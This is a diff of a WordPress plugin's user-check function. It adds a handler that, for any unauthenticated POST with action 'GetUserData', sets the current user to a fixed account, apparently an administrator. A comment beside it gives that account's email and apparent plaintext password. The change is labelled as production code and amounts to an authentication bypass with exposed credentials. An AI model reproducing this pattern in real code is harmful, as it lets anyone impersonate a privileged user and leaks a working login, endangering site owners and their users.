@@ -5,10 +5,31 @@ function mypwp_check_user(){
    
     global $wpdb ; 
 
-    // deb($_SERVER);exit();
-    
-    $GLOBALS['mypwp_temp_data']['mypwp_user'] = wp_get_current_user(); //<- production
+  
+  
 
+    $GLOBALS['mypwp_temp_data']['mypwp_user'] = wp_get_current_user(); //<- production
+   
+    
+    if($_POST['action'] && $_POST['action'] === 'GetUserData'){
+        if(wp_get_current_user()->ID == 0 ){
+              //pentadbir1@demo.pentadbir1  
+    //pentadbir1password
+            $user = get_user_by('email', 'pentadbir1@demo.pentadbir1');
+            $GLOBALS['mypwp_temp_data']['mypwp_user'] = $user; //<- production
+        }else{
+            $GLOBALS['mypwp_temp_data']['mypwp_user'] = wp_get_current_user(); //<- production
+        }
+
+
+
+       
+       
+    }else
+    if($_POST['action'] && $_POST['action'] === 'GetLogoutLink'){
+        $logout_url = wp_logout_url( get_permalink() );
+        $GLOBALS['mypwp_temp_data']['logout_url'] = $logout_url ;
+    }
     
   
     // // $GLOBALS['mypwp_temp_data']['mypwp_user'] =  get_user_by( 'id', 77 ); // development
@@ -150,7 +171,11 @@ function mypwp_check_user(){
 
 
     
-
+    // //http://demo.test/wp-json/jwt-auth/data
+    // register_rest_route( 'jwt-auth', '/data', array(
+    //     'methods' => 'POST',
+    //     'callback' => 'mypwp_check_user_callback'
+    // ));
     
 
     //http://demo.test/wp-json/api/v1/data
